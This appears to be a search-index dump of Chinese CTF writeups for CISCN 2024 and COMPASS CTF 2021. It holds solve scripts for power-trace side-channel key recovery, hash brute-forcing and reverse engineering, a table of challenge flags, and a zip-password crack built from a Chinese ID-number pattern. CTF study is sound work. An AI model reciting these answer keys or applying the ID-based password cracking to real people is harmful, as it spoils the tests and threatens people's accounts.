\u7b2c\u4e94\u9875Notes\u6709\u5bc6\u6587\u548c\u63d0\u793aN\u8f6ebase64\u89e3\u5bc6</p> <p>Part6: \u7b2c\u4e94\u9875\u7f29\u5c0f\u540e\uff0c\u5de6\u4e0a\u89d2\u6709\u7f29\u5c0f\u7684\u5bc6\u6587<code>UGFyVDY6ZC0y</code> base64\u89e3\u5bc6</p> <p>Part7: \u6253\u5f00\u7a97\u4f53\uff0c\u7b2c\u56db\u9875\u6709\u5bc6\u6587<code>HRSFIQp9ZwWvZj==</code>\uff0c\u63d0\u793aROT13\u5e76\u52fe\u9009\u6240\u6709\uff0cbase64\u89e3\u5bc6</p> <p>Part8: \u70b9\u5f00\u6a21\u7248\uff0c\u627e\u5230\u7b2c\u4e09\u5f20\u5220\u9664\u80cc\u666f\u540e\uff0c\u6839\u636e\u63d0\u793a\u5f97\u5230\u5bc6\u6587\uff0cbase64\u89e3\u5bc6</p> <p>Part9: binwalk \u63d0\u53d6\uff0c\u627e\u5230\u4e00\u5806\u7167\u7247\uff0c\u5176\u4e2d\u6709\u4e00\u5f20PPT\u6ca1\u6709\u7684furry\u56fe\uff0c\u5de6\u4e0b\u89d2\u6709\u5bc6\u6587base64\uff0c\u7528\u89e3\u7801</p> <p>Part10: \u7b2c4\u9875\u7684Comments\u6709\u4e00\u6bb5\u5bf9\u8bdd\uff0c\u7ed9\u51fa\u4e86\u5bc6\u6587<code>ZYWJbIYnFhq9</code>\u5bc6\u94a5<code>furry</code>\uff0c\u7528<code>Vigenere</code>\u52a0\u5bc6</p> <p>\u62fc\u63a510\u4e2apart\u5f97\u5230flag\u3002</p> <p>flag: <code>flag{e675efb3-346f-405f-90dd-2622b387edee9}</code></p>"},{"location":"Writeup/2024ciscn1/ciscn2024_compass_wp/#_4","title":"\u901a\u98ce\u673a","text":"<p>\u627e\u4e86\u4e00\u5c0f\u65f6mwp\u6253\u5f00\u65b9\u6cd5\u7136\u540e\u6478\u9c7c\u7684\u65f6\u5019\u53d1\u73b0\u4e0d\u7528\u6253\u5f00...</p> <p>\u62ff\u5230<code>1\u901a\u98ce\u673a\u76d1\u63a7.mwp</code>\uff0c\u6ca1\u89c1\u8fc7\u7684\u6587\u4ef6\u683c\u5f0f\u3002\u5148\u7528binwalk\u63d0\u53d6\uff0c\u7136\u540e<code>strings</code>\u63d0\u53d6\u5b57\u7b26\u4e32\uff0c\u5f97\u5230\u4e00\u4e32\u53ef\u7591\u5b57\u7b26<code>ZmxhZ3syNDY3Y2UyNi1mZmY5LTQwMDgtOGQ1NS0xN2RmODNlY2JmYzJ9</code>, \u7528base64\u89e3\u7801\u540e\u5373\u83b7\u5f97flag\u3002</p> <p>flag: <code>flag{2467ce26-fff9-4008-8d55-17df83ecbfc2}</code></p>"},{"location":"Writeup/2024ciscn1/ciscn2024_compass_wp/#power-trajectory-diagram","title":"Power Trajectory Diagram","text":"<p>\u8be5\u9898\u76ee\u7ed9\u51fa\u4e86index\uff0cinput\u548c\u5bf9\u5e94\u7684trace\uff0ctrace\u662f5000\u4e2a\u70b9\u53d6\u6837\u529f\u8017\u3002\u5bf9\u6bcf\u4e2aindex\uff0c\u5c0640\u79cdinput\u5bf9\u5e94\u7684trace\u529f\u8017\u66f2\u7ebf\u8ba1\u7b97\u5e73\u5747\u540e\uff0c\u627e\u5230\u504f\u5dee\u503c\u6700\u5927\u7684input\uff0c\u8be5input\u5373\u4e3a\u5f53\u524dindex\u7684\u5bc6\u94a5\u3002</p> <pre><code>import numpy as np\nimport matplotlib.pyplot as plt\n\n# \u52a0\u8f7dnpz\u6587\u4ef6\ndata = np.load('data.npz')\nindex = data['index']\ninput_data = data['input']\ntrace = data['trace']\n\n# \u521d\u59cb\u5316\u5bc6\u94a5\u6570\u7ec4\nkey = [''] * 13\n\n# \u904d\u5386\u6bcf\u4e2aindex\u503c\nfor i in range(13):\n    # \u83b7\u53d6\u5f53\u524dindex\u5bf9\u5e94\u7684\u6240\u6709trace\n    idx = np.where(index == i)[0]\n    traces = trace[idx]\n    inputs = input_data[idx]\n\n    # \u8ba1\u7b97\u6bcf\u4e2ainput\u7684\u5e73\u5747\u529f\u8017\u8f68\u8ff9\n    unique_inputs = np.unique(inputs)\n    avg_traces = []\n    for ui in unique_inputs:\n        ui_traces = traces[inputs == ui]\n        avg_trace = np.mean(ui_traces, axis=0)\n        avg_traces.append(avg_trace)\n\n    avg_traces = np.array(avg_traces)\n\n    # \u627e\u5230\u5dee\u5f02\u6700\u5927\u7684trace\n    max_diff = 0\n    best_input = ''\n    for j in range(len(unique_inputs)):\n        for k in range(j+1, len(unique_inputs)):\n            diff = np.linalg.norm(avg_traces[j] - avg_traces[k])\n            if diff &gt; max_diff:\n                max_diff = diff\n                best_input = unique_inputs[j]\n\n    key[i] = best_input\n\nprint(\"Recovered Key:\", ''.join(key))\n</code></pre> <p>\u8be5\u811a\u672c\u4e0d\u80fd\u5b8c\u5168\u89e3\u6790\uff0c\u9700\u8981\u90e8\u5206\u4eba\u5de5\u89c2\u5bdf\uff08\u4f8b\u5982<code>ciscm</code>\u5e94\u8be5\u4e3a<code>ciscn</code></p>"},{"location":"Writeup/2024ciscn1/ciscn2024_compass_wp/#crypto","title":"Crypto","text":""},{"location":"Writeup/2024ciscn1/ciscn2024_compass_wp/#_5","title":"\u53e4\u5178\u5bc6\u7801","text":"<p>\u5bc6\u6587<code>AnU7NnR4NassOGp3BDJgAGonMaJayTwrBqZ3ODMoMWxgMnFdNqtdMTM9</code></p> <p>\u4e00\u5f00\u59cbCyberchef\u63d0\u793a\u662fbase64\uff0c\u5c1d\u8bd5\u540e\u65e0\u679c\u3002\u4e8e\u662f\u5c1d\u8bd5\u6240\u6709\u5e38\u89c1\u53e4\u5178\u5bc6\u7801\uff0c\u6700\u540e\u53d1\u73b0atbash\u5bc6\u7801\u89e3\u5bc6\u540e\u518dbase64\u89e3\u5bc6\u7684\u7ed3\u679c\u548c\u53ef\u80fd\u662fflag\u3002\u683c\u5f0f\u975e\u5e38\u50cfuuid\u4e14\u5f00\u5934flag\u9519\u4f4d\uff0c\u663e\u7136\u662f\u6805\u680f\u5bc6\u7801\u3002</p> <p>flag: <code>flag{b2bb0873-8cae-4977-a6de-0e298f0744c3}</code></p>"},{"location":"Writeup/2024ciscn1/ciscn2024_compass_wp/#hash","title":"hash","text":"<p>\u5728python2.7\u4e2d\uff0c\u9605\u8bfbpython\u53ef\u77e5\uff0chash\u7684\u52a0\u5bc6\u7b26\u5408\u4ee5\u4e0b\u51fd\u6570</p> <pre><code>long long hash(unsigned char k[], len)\n{\n    unsigned long long x = k[0] &lt;&lt; 7;\n    for (int i = 0; i &lt; len; i++)\n        x = (x * 1000003) ^ k[i];\n    return (long long)(x ^ len);\n}\n</code></pre> <p>\u6839\u636e\u63d0\u4f9b\u7684 <code>hash(key)</code> \u7684\u503c\uff0c\u901a\u8fc7\u4ee5\u4e0b\u4ee3\u7801\u9884\u5904\u7406\u540e\u4e24\u4e2abyte\u7684\u6240\u6709\u53ef\u80fd\uff1a</p> <pre><code>for (int p7 = 0; p7 &lt; 256; p7++)\n{\n    a[p7] = 7457312583301101236llu ^ p7;\n    a[p7] *= 16109806864799210091llu;\n}\nfor (int p7 = 0; p7 &lt; 256; p7++)\n    for (int p6 = 0; p6 &lt; 256; p6++)\n    {\n        unsigned long long t = a[p7] ^ p6;\n        t *= 16109806864799210091llu;\n        b[t / 1000] = p6;\n    }\n</code></pre> <p>\u4e4b\u540e\u901a\u8fc7\u4ee5\u4e0b\u4ee3\u7801\u66b4\u529b\u524d\u56db\u4e2abyte\uff1a</p> <pre><code>for (int i = 0; i &lt; 256; i++, printf(\"%d\\n\", i))\n    for (int j = 0; j &lt; 256; j++)\n        for (int k = 0; k &lt; 256; k++)\n            for (int l = 0; l &lt; 256; l++)\n            {\n                unsigned long long x = i &lt;&lt; 7;\n                x = (x * 1000003) ^ i;\n                x = (x * 1000003) ^ j;\n                x = (x * 1000003) ^ k;\n                x = (x * 1000003) ^ l;\n                x = (x * 1000003);\n                if (b.count(x/1000) &gt; 0)\n                {\n                    printf(\"%02x %02x %02x %02x\\n\", i, j, k, l);\n                }\n            }\n</code></pre> <p>\u6700\u540e\u66b4\u529b\u540e\u4e09\u4e2abyte\uff1a</p> <pre><code>for (int p1 = 0; p1 &lt; 256; p1++)\n    for (int p2 = 0; p2 &lt; 256; p2++)\n        for (int p3 = 0; p3 &lt; 256; p3++)\n        {\n            unsigned long long x = 0x5d &lt;&lt; 7;\n            x = (x * 1000003) ^ 0x5d;\n            x = (x * 1000003) ^ 0x8c;\n            x = (x * 1000003) ^ 0xf0;\n            x = (x * 1000003) ^ 0x3f;\n            x = (x * 1000003) ^ p1;\n            x = (x * 1000003) ^ p2;\n            x = (x * 1000003) ^ p3;\n            x ^= 7;\n            if ((long long)x == 7457312583301101235ll)\n                printf(\"%02x %02x %02x\\n\", p1, p2, p3);\n        }\n</code></pre> <p>\u5f97\u5230key\u4e3a<code>\\x5d\\x8c\\xf0\\x3f\\x5a\\x08\\x52</code>\uff0c\u4e4b\u540e\u6309\u9898\u76ee\u89e3\u5bc6\u5373\u53ef\u3002</p>"},{"location":"Writeup/2024ciscn1/ciscn2024_compass_wp/#_6","title":"\u7528\u6237\u4fe1\u606f\u8bbf\u95ee\u63a7\u5236","text":"<p>\u9605\u8bfb\u7406\u89e3\u9898\uff0c\u6309\u7167\u6587\u6863\u5b9e\u73b0\u5373\u53ef\u3002</p> <p><code>record.list</code></p> <pre><code>{\n    \"name\":\"cell\",\n    \"isleveladjust\":1,\n    \"isselfdefine\":0,\n    \"class\":0,\n    \"level_fix\":0,\n    \"level_adjust\":-1\n}\n{\n    \"name\":\"email\",\n    \"isleveladjust\":1,\n    \"isselfdefine\":0,\n    \"class\":0,\n    \"level_fix\":0,\n    \"level_adjust\":-2\n}\n</code></pre> <p><code>record_acl.c</code></p> <pre><code>    if (strcmp(record_name, \"salary\") == 0) {\n        if (strcmp(read_user, record_user) == 0) {\n            return 1;\n        }\n    }\n</code></pre>"},{"location":"Writeup/2024ciscn1/ciscn2024_compass_wp/#_7","title":"\u5e73\u53f0\u53ef\u4fe1\u8ba4\u8bc1","text":"<p>\u4ee3\u7801\u62c9\u4e0b\u6765\u53d1\u73b0\u662f\u4e2agit\u4ed3\u5e93\u3002 \u9700\u8981\u8865\u5168\u7684\u662f<code>key_server_return.c</code>\u4e2d\u7684<code>verify_output()</code>\u3002 \u67e5\u627egit changes\uff0c\u53d1\u73b0\u6709\u4e00\u4e2a\u5220\u9664\u4e86\u7684<code>event_judge.c</code>\uff0c\u5185\u5bb9\u548c\u9700\u8981\u8865\u5168\u7684\u4ee3\u7801\u51e0\u4e4e\u5b8c\u5168\u4e00\u81f4\u3002 \u4fee\u6539\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>    else\n    {\n        // \u8ba1\u7b97PCR\u9884\u671f\u503c\u5e76\u4e0e\u62a5\u544a\u4e2d\u6570\u503c\u6bd4\u8f83\n        for(i=0;trust_policy[i].name!=NULL;i++)\n        {\n\n            db_record = memdb_find_first(TYPE_PAIR(GENERAL_RETURN,UUID),\n                \"name\",trust_policy[i].name);\n            if(db_record == NULL)\n                return NULL;\n            policy_digest = db_record-&gt;record;\n            result = TCM_ExAddPcrComposite(pcr_result,trust_policy[i].value,\n                policy_digest-&gt;return_value);\n                    printf(\"policy name : %s value :\",policy_digest-&gt;name);\n                    print_bin_data(policy_digest-&gt;return_value,32,16);\n            }\n\n        // \u4ece\u62a5\u544a\u4e2d\u83b7\u53d6pcr\u503c\n        pcr_report=&amp;(quote_report-&gt;pcrComp);\n\n        // \u8fdb\u884c\u6bd4\u8f83\uff0c\u5e76\u6839\u636e\u6bd4\u8f83\u7ed3\u679c\u8d4b\u503c\n        if((Memcmp(pcr_result-&gt;select.pcrSelect,\n            pcr_report-&gt;select.pcrSelect,3)==0)\n         &amp;&amp; (Memcmp(pcr_result-&gt;pcrValue,pcr_report-&gt;pcrValue,\n            pcr_report-&gt;valueSize)==0))\n        {\n                verify_result-&gt;name=dup_str(\"trust verify succeed\",0);\n        }   \n        else\n        {\n                verify_result-&gt;name=dup_str(\"trust verify fail\",0);\n        }\n    }\n</code></pre>"},{"location":"Writeup/2024ciscn1/ciscn2024_compass_wp/#reverse","title":"Reverse","text":""},{"location":"Writeup/2024ciscn1/ciscn2024_compass_wp/#asm_re","title":"asm_re","text":"<p>\u9605\u8bfb\u6e90\u7801\u53ef\u77e5\uff0c\u662f\u5bf9flag\uff0c\u8fdb\u884c\u4e58<code>0x50</code>\u3001\u52a0<code>0x14</code>\u3001\u5f02\u6216<code>0x4D</code>\u3001\u52a0<code>0x1E</code>\uff0c\u6700\u540e\u4e0eunk_100003F10\u6bd4\u5bf9\u3002\u8be5\u6570\u7ec4\u4f7f\u7528\u5c0f\u7aef\u5e8f\uff0c\u5c06\u56db\u5b57\u8282\u5408\u5e76\u4e3a\u4e00\u4e2aint\u540e\uff0c\u9006\u5411\u89e3\u5bc6\u53ef\u5f97flag\u3002</p> <pre><code>const int merged_array[] = {\n    0x00001FD7, // __const:100003F10\n    0x000021B7, // __const:100003F14\n    0x00001E47, // __const:100003F18\n    0x00002027, // __const:100003F1C\n    0x000026E7, // __const:100003F20\n    0x000010D7, // __const:100003F24\n    0x00001127, // __const:100003F28\n    0x00002007, // __const:100003F2C\n    0x000011C7, // __const:100003F30\n    0x00001E47, // __const:100003F34\n    0x00001017, // __const:100003F38\n    0x00001017, // __const:100003F3C\n    0x000011F7, // __const:100003F40\n    0x00002007, // __const:100003F44\n    0x00001037, // __const:100003F48\n    0x00001107, // __const:100003F4C\n    0x00001F17, // __const:100003F50\n    0x000010D7, // __const:100003F54\n    0x00001017, // __const:100003F58\n    0x00001017, // __const:100003F5C\n    0x00001F67, // __const:100003F60\n    0x00001017, // __const:100003F64\n    0x000011C7, // __const:100003F68\n    0x000011C7, // __const:100003F6C\n    0x00001017, // __const:100003F70\n    0x00001FD7, // __const:100003F74\n    0x00001F17, // __const:100003F78\n    0x00001107, // __const:100003F7C\n    0x00000F47, // __const:100003F80\n    0x00001127, // __const:100003F84\n    0x00001037, // __const:100003F88\n    0x00001E47, // __const:100003F8C\n    0x00001037, // __const:100003F90\n    0x00001FD7, // __const:100003F94\n    0x00001107, // __const:100003F98\n    0x00001FD7, // __const:100003F9C\n    0x00001107, // __const:100003FA0\n    0x00002787  // __const:100003FA4\n};\nint main()\n{\n    for (int i = 0; i &lt; 38; i++)\n        printf(\"%c\", (((merged_array[i]-0x1e)^0x4d)-0x14)/0x50);\n}\n</code></pre>"},{"location":"Writeup/2024ciscn1/ciscn2024_compass_wp/#androidso_re","title":"androidso_re","text":"<p>\u7528jadex\u53cd\u7f16\u8bd1\uff0c\u70b9\u5f00flag\u9a8c\u8bc1\u51fd\u6570\uff0c\u53d1\u73b0\u662fDES\u52a0\u5bc6\u540ebase64\uff0c\u5bc6\u6587\u5728<code>inspect</code>\u51fd\u6570\uff0c\u5bc6\u94a5key\u548c\u521d\u59cb\u5316\u5411\u91cfIV\u4ece<code>Secret_entrance.so</code>\u4e2d\u7684\u51fd\u6570<code>getiv()</code>\u548c<code>getkey()</code>\u83b7\u5f97\u3002\u4e8e\u662f\u9006\u5411<code>Secret_entrance.so</code>\u3002</p> <p><code>get_fixediv()</code>\u9605\u8bfb\u53cd\u7f16\u8bd1\u4ee3\u7801\u540e\u5f97\u77e5\uff0c\u5c06\u5bc6\u6587<code>F2IjBoh1mRW=</code> ROT16\u540e\u518dbase64\u89e3\u5bc6\uff0c\u5f97\u5230iv <code>Wf3DLups</code></p> <p><code>getkey()</code> \u5219\u662f\u5c06\u5bc6\u6587<code>TFSecret</code>\u7528RC4\u89e3\u5bc6\uff0c\u5bc6\u94a5\u4e3a<code>YourRC4Key</code>\uff08\u5bc6\u94a5\u63d0\u793a\u4e86\u52a0\u5bc6\u7b97\u6cd5\uff09\uff0c\u89e3\u5bc6\u540e\u518d\u8ddf<code>038933b8540c206a</code>\u5f02\u6216\uff0c\u5f97\u5230key<code>A8UdWaeq</code></p> <p>\u6700\u540eDES\u89e3\u5bc6\uff0c\u83b7\u5f97flag</p> <p>flag: <code>flag{188cba3a5c0fbb2250b5a2e590c391ce}</code></p> <p>\ufeff### whereThel1b</p> <p>\u7ecf\u8fc7\u89c2\u5bdf\uff0c\u4e0d\u96be\u53d1\u73b0\uff0c\u53ea\u6539\u53d8\u8f93\u5165\u7684\u67d0\u4e00\u4f4d\u7684\u60c5\u51b5\u4e0b\uff0c\u8f93\u51fa\u4e5f\u53ea\u4f1a\u6709\u5176\u4e2d\u7684\u4e00\u4e24\u4f4d\u53d1\u751f\u53d8\u5316\uff1a</p> <pre><code>&gt;&gt;&gt; whereThel1b.trytry(b'123456789')\n[75, 88, 79, 122, 74, 76, 82, 52, 66, 126, 96, 48]\n&gt;&gt;&gt; whereThel1b.trytry(b'12345a789')\n[75, 88, 79, 122, 74, 76, 81, 110, 66, 126, 96, 48]\n&gt;&gt;&gt; whereThel1b.trytry(b'12a45a789')\n[75, 88, 76, 104, 74, 76, 81, 110, 66, 126, 96, 48]\n&gt;&gt;&gt;\n</code></pre> <p>\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6709\u7406\u6709\u636e\u5730\u731c\u6d4b\uff0c\u5728\u8f93\u5165\u957f\u5ea6\u4e00\u5b9a\u7684\u60c5\u51b5\u4e0b\uff0c\u8f93\u5165\u4e2d\u7684\u6bcf\u4e00\u4f4d\u662f\u4e92\u4e0d\u5f71\u54cd\u7684\u3002\u5e76\u4e14\u53ef\u4ee5\u6ce8\u610f\u5230\uff1a</p> <pre><code>&gt;&gt;&gt; whereThel1b.trytry(b'12a45a789fsdjkvjklsjeoru203uflksdj')\n[85, 100, 80, 106, 94, 100, 73, 113, 93, 100, 113, 16, 87, 78, 70, 121, 105, 93, 114, 21, 113, 79, 89, 85, 106, 33, 118, 66, 102, 24, 95, 47, 110, 108, 87, 97, 112, 112, 114, 126, 66, 45, 82, 74, 11\n3, 100, 30, 61]\n&gt;&gt;&gt; bytes(_)\nb'UdPj^dIq]dq\\x10WNFyi]r\\x15qOYUj!vBf\\x18_/nlWappr~B-RJqd\\x1e='\n</code></pre> <p>\u5c31\u662f\u8bf4\uff0c\u8f93\u5165\u4f1a\u7ecf\u8fc7 base64 \u8f6c\u6362\uff0c\u957f\u5ea6\u4f1a\u53d8\u6210\u539f\u6765\u7684 4/3 \u500d\u3002\u6240\u4ee5 flag \u7684\u957f\u5ea6\u5c31\u662f <code>len(encry) / 4 * 3</code>\uff0c\u5373 42\u3002</p> <p>\u65e2\u7136\u6bcf\u4e2a\u5b57\u7b26\u4e4b\u95f4\u4e92\u4e0d\u5f71\u54cd\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u7528\u6a21\u62df\u9000\u706b\u6765\u505a\uff1a</p> <pre><code>import random\nimport math\n\nimport whereThel1b\n\ndef shared(lhs, rhs):\n    return sum([ x == y for x, y in zip(lhs, rhs) ])\n\n\nencry = [108, 117, 72, 80, 64, 49, 99, 19, 69, 115, 94, 93, 94, 115, 71, 95, 84, 89, 56, 101, 70, 2, 84, 75, 127, 68, 103, 85, 105, 113, 80, 103, 95, 67, 81, 7, 113, 70, 47, 73, 92, 124, 93, 120, 104, 108, 106, 17, 80, 102, 101, 75, 93, 68, 121, 26]\n\nflag = [ 0 ] * 42\nALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&amp;()*+,-./:;&lt;=&gt;?@[]^_`{|}~'\n\nt = 0.7\ni = 0\nflag_val = 0\nwhile True:\n    t *= 0.99998\n    i += 1\n    if i &amp; 511 == 0:\n        print(bytes(flag), flag_val, t)\n\n    current = flag[:]\n    j = random.randrange(0, len(current))\n    current[j] = ord(random.choice(ALPHABET))\n\n    seed = random.randrange(0, 1 &lt;&lt; 64)\n    current_val = shared(whereThel1b.trytry(bytes(current)), encry)\n    random.seed(seed)\n\n    delta = current_val - flag_val\n    if math.exp(delta / t) &gt; random.random():\n        flag_val = current_val\n        flag = current\n</code></pre> <p>\u8fd0\u884c\u7ed3\u679c</p> <p></p>"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/","title":"COMPASS CTF 2021 \u62db\u65b0\u8d5b","text":""},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#_1","title":"\u9898\u76ee\u5185\u5bb9","text":"\u5206\u7c7b \u540d\u79f0 \u96be\u5ea6 \u63cf\u8ff0 \u6587\u4ef6 flag MISC SanityCheck \u7b7e\u5230 \u6b22\u8fce\u6765\u5230COMPASS CTF! \u5149\u789f\u3001\u55b5\u54aa\u548cls\u53ef\u4ee5\u5e2e\u4f60\u62ff\u5230flag\u3002 sign.html flag{we1c0m3_tO_C0MP4SS_CTF_2021!GLHF} MISC ezPWD \u7b80\u5355 \u4f60\u7684\u4e00\u4f4d\u6765\u81ea\u9655\u897f\u897f\u5b89\u4e34\u6f7c\u533a\u768490\u540e\u5b66\u59d0\u53d1\u7ed9\u4f60\u4e00\u4efd\u795e\u79d8\u538b\u7f29\u5305\uff0c\u4f60\u80fd\u6253\u5f00\u5417 flag.zip flag{Brut3_f0rc3_1s_just_345y} Web Hacked \u7b7e\u5230 \u5927\u9ed1\u5ba2\u9ed1\u6389\u4e86COMPASS\u7684\u7f51\u7ad9\u5e76\u7559\u4e0b\u4e86flag\uff0c\u4f46\u662f\u9700\u8981\u6b63\u786e\u8f93\u5165\u53e3\u4ee4\u624d\u80fd\u770b\u5230\u3002 Hacked.html flag{Ev3ry_0ne_1ove5_baNaNa_exCept_fu*k1n9_js} Web trickyPHP \u4e00\u822c \u653b\u514b\u96be\u5173\uff0c\u5165\u95e8web\uff0c\u8d62\u53d6flag trickyPHP.php flag{y0u_b34t_pHp_and_WOn_uR_reward!} web Life Restart \u4e00\u822c \u8fd9\u5783\u573e\u4eba\u751f\u4e00\u79d2\u4e5f\u4e0d\u60f3\u5446\u4e86\uff0cremake\uff01(500\u5c81\u65f6\u6e21\u52ab\u6210\u529f\u8d62\u53d6flag) http://81.68.223.245:8080/view/ flag{My_fate_1s_up_to_M3_in_Cyber_W0rld} Web BBS \u4e2d\u7b49 COMPASS\u5f00\u901a\u4e86bbs demo\uff0c\u73b0\u5728\u5f00\u653e\u6ce8\u518c~\u7ba1\u7406\u5458\u5728flag.php\u4e2d\u5199\u5165\u4e86\u5b9d\u8d35\u7684flag\uff0c\u4ee5\u6b64\u8bc1\u660eBBS\u7684\u5b89\u5168\u6027 COMPASS_BBS flag{U_mast3red_inj3ctiOn_Unser1alize_and_SSrF!} Crypto at_bash \u7b7e\u5230 COMPASS\u622a\u83b7\u4e86\u4e00\u6bb5\u542b\u6709flag\u7684\u6587\u672c\uff0c\u4f46\u662f\u6587\u672c\u4e2d\u770b\u8d77\u6765\u5e76\u6ca1\u6709flag\u5b57\u6837 at_bash.txt flag{wOW_y0U_Real1y_ma5ter3d_enc0d1ng!} Crypto variable \u7b80\u5355 \u636e\u8bf4\u521d\u4e2d\u751f\u66f4\u52a0\u64c5\u957fcrypto\u7684\u7834\u89e3\uff0c\u4e3a\u4e86\u593a\u56de\u672c\u79d1\u751f\u7684\u5c0a\u4e25\uff0c\u4f60\u5411\u521d\u4e2d\u5c0fA\u53d1\u8d77\u4e86\u6311\u6218 enc.py enc.txt flag{Now_u_H4v3_the_abil1Ty_to_Crypt0!} Crypto CBC \u8f83\u96be \u65b0\u6982\u5ff5\u7684Python\u6c99\u76d2\uff0c\u8ba9Python\u518d\u6b21\u4f1f\u5927\uff01 CBC.py flag{w0W_s3Ems_u_really_g00D_4t_crypt0!} Re bogo \u7b7e\u5230 \u7334\u5b50\u5728\u65e0\u9650\u7684\u65f6\u95f4\u5185\u53ef\u4ee5\u5199\u51fa\u838e\u58eb\u6bd4\u4e9a\uff0c\u8fd9\u4e5f\u662f\u4e00\u9053\u80fd\u81ea\u5df1\u5199\u51faflag\u7684\u9006\u5411\u9898\uff01 bogo.elf flag{we1c0m3_tO_rEv3re_w0r1d!} Re Extremely slow \u4e00\u822c COMPASS\u5b9e\u9a8c\u5ba4\u622a\u83b7\u4e86\u4e00\u4e2a\u53ef\u4ee5\u5feb\u901f\u5206\u89e3\u6df7\u6c8c\u4e3aflag\u7684\u5f3a\u5927\u539f\u578b\u673a\uff0c\u4f46\u662f\u5b83\u5341\u5206\u4e0d\u7a33\u5b9a\uff0c\u53ea\u80fd\u8fd0\u884c\u5f88\u77ed\u7684\u65f6\u95f4... Extremely_slow.exe flag{p47ch_PrO6r4m_1s_n0t_A_h4rd_7hin9} Re Random \u8f83\u96be \u4e0a\u5e1d\u4e0d\u4f1a\u63b7\u9ab0\u5b50\uff0c\u4ece\u6765\u6ca1\u6709\u771f\u6b63\u7684\u968f\u673a Random.exe flag{Exc3l13nt_y0u_gOt_7h3_r4nd0m_k3y!284} Re java_re \u538b\u8f74 Jar\u662f\u4e2a\u7cdf\u7cd5\u7684Zip\u6587\u4ef6\uff0c\u4f46\u5b83\u80fd\u6709\u4ec0\u4e48\u574f\u5fc3\u773c\u5462\uff1f(hint \u4ee3\u7801\u5f88\u4e71\uff1f\u5176\u5b9e\u903b\u8f91\u5e76\u4e0d\u590d\u6742\u3002IDEA\u81ea\u5e26\u7684\u9006\u5411\u5f88\u5f3a\u5927) EzJar.jar flag{Ctf3r_me_1s_A_very_g0Od_9Uy} PWN dove1 \u7b7e\u5230 \u6bcf\u6b21\u6821\u961f\u8bad\u7ec3\u603b\u6709\u9e3d\u5b50\u51fa\u73b0\uff0cCOMPASS\u53d1\u51fa\u60ac\u8d4f\uff1a\u5e26\u56de\u9e3d\u5b50\u4e00\u6b21\u5c31\u53ef\u4ee5\u83b7\u5f97flag\uff01\u4f60\u51b3\u5b9a\u53bb\u529d\u8bf4\u9e3d\u5b50\u8d70\u4e0a\u6b63\u8f68\u9053\uff08hint1 \u529d\u8bf4\u53ea\u6709\u7b2c10\u79cd\u529e\u6cd5\u662f\u6709\u6548\u7684\uff09\uff08hint2 \u53cd\u7f16\u8bd1\u4f2a\u4ee3\u7801\u4e0d\u6b63\u5e38\u53ef\u4ee5\u770b\u770b\u53cd\u6c47\u7f16\u754c\u9762\uff0c\u6ce8\u610f\u53d8\u91cf\u7684\u7c7b\u578b\uff09\uff08hint3 rand\u7684\u79cd\u5b50\u7cbe\u5ea6\u4e0d\u591f\u4e0d\u96be\u9884\u6d4b\uff09 dove flag{5ome_0ne_1s_dove_I_dont_say_whO_1s} PWN dove2 \u7b80\u5355 \u591a\u6b21\u6210\u529f\u529d\u8bf4\u9e3d\u5b50\u540e\u5b83\u4ecd\u7136\u4e00\u610f\u5b64\u884c\uff0c\u4f60\u51b3\u5b9a\u6765\u70b9\u786c\u7684 dove flag{U_rea11y_g0Od_At_bringing_d0ve_back} PWN wish \u8f83\u96be \u4e00\u53e3\u8bb8\u613f\u4e95\uff0c\u4f60\u53ef\u4ee5\u5bf9\u5b83\u503e\u8bc9\u4efb\u4f55\u4e8b\u60c5\uff0c\u4f46\u662f\u5b83\u4f3c\u4e4e\u5f88\u5c11\u5bf9\u613f\u671b\u4f5c\u51fa\u56de\u5e94 wish flag{PWN_1s_s0_tricky_go0Od_job} PWN Double Frank \u9632AK \u6b22\u8fce\u6765\u5230Frank\u9910\u9986\uff0c\u8bf7\u95ee\u4f60\u4eca\u5929\u8981\u6765\u70b9\u4ec0\u4e48\u6837\u7684Frank\u5462\uff1f Frank flag{YOU_beat_frank_n0w_frankss_1s_a11_yOurs!}"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#_2","title":"\u9898\u89e3","text":"<p>\u65b0\u624b\u53cb\u597d\uff0c\u9898\u76ee\u6709\u8da3  \u6bd4\u8d5b\u5185\u5bb9\u5305\u542b\u7f51\u7edc\u653b\u51fb\uff0c\u52a0\u5bc6\u89e3\u5bc6\uff0c\u7a0b\u5e8f\u9006\u5411\u7834\u89e3\uff0c\u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528\u7b49\u3002</p>"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#misc","title":"MISC","text":""},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#sanitycheck","title":"SanityCheck","text":"<p>\u7b7e\u5230\uff0c\u9996\u5148</p> <p>cd home</p> <p>\u7136\u540e</p> <p>cat flag.txt</p>"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#ezpwd","title":"ezPWD","text":"<p>\u9655\u897f\u897f\u5b89\u4e34\u6f7c\u533a \u5206\u522b\u5bf9\u5e9461 01 15 \u5e74\u4efd1990-1999  \u67081-12 \u65e51-31 \u7f16\u53f70-999 \u6821\u9a8c\u7801\u56fa\u5b9a  \u6839\u636e\u6761\u4ef6\u751f\u6210\u5b57\u5178\u590d\u6742\u5ea6\u5f88\u4f4e\uff0c\u7206\u7834\u5373\u53ef\u5f97\u5230\u538b\u7f29\u5305\u5bc6\u7801  610115199309102764 \u4ee5\u4e0b\u662f\u5404\u79cd\u5bc6\u7801\u6062\u590d\u8f6f\u4ef6\u7684\u622a\u56fe\uff1a - john kali\u81ea\u5e26 \u514d\u8d39 \u9ad8\u6548 \u5f3a\u5927 \u4ec5\u75286\u79d2  - archpr 